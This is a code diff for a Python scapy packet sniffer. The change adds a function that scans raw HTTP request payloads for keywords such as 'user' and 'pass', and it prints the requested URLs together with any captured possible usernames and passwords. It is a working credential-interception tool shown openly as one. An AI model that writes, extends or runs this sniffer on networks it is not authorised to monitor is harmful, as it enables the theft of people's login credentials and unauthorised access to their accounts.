@@ -16,9 +16,23 @@ def sniffer(interface):
     scapy.sniff(iface=interface, store=False, prn=sniffPacket)
 
 
+def getLoginInfo(packet):
+    if packet.haslayer(scapy.Raw):
+        load = str(packet[scapy.Raw].load)
+        keywords = ["login","user","username","pass","password"]
+        for key in keywords:
+                if key in load:
+                    return load
+
+
 def sniffPacket(packet):
     if packet.haslayer(http.HTTPRequest):
-        print(packet)
+        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+        print("[+] HTTPRequest >> " + str(url))
+
+        loginInfo = getLoginInfo(packet)
+        if loginInfo:
+            print("\n\n[+] Possible username/password >> " + loginInfo + "\n\n")
 
 
 options = getArguments()
